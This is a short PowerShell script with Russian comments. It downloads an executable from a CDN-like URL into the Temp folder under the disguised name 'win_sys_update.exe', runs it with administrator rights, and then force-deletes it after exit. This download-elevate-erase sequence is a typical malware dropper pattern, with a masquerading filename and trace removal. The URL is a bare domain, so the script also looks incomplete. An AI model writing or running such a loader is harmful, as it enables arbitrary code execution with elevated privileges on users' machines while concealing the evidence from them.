# Ссылка на ваш исполняемый файл через рабочее зеркало cdn.jsdelivr.net
$url = "https://jsdelivr.net"
$path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"

# Скачивание файла во временную папку
Invoke-WebRequest -Uri $url -OutFile $path

# Запуск файла от имени администратора. Скрипт будет ждать, пока вы не закроете программу
Start-Process -FilePath $path -Verb RunAs -Wait

# Полное удаление файла с вашего компьютера сразу после закрытия программы
Remove-Item -Path $path -Force
